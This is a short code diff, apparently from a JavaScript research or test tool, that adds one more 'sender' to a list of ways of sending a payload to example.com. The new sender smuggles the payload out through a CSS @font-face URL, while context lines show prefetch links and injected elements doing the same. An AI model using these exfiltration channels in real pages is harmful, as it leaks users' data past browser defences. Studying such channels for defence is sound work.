@@ -30,6 +30,18 @@ const senders = [
         document.body.appendChild(i)
     },
     payload => {
+        const css = `@font-face {
+            font-family: myFontNotEvilAtAll;
+            src: url(https://example.com/?q=${payload});
+        }`
+        const style = document.createElement('style');
+
+        style.type = 'text/css';
+        style.styleSheet.cssText = css;
+
+        document.head.appendChild(style);
+    },
+    payload => {
         const l = document.createElement('link')
         l.rel = 'prefetch'
         l.href = `https://example.com/?q=${payload}`
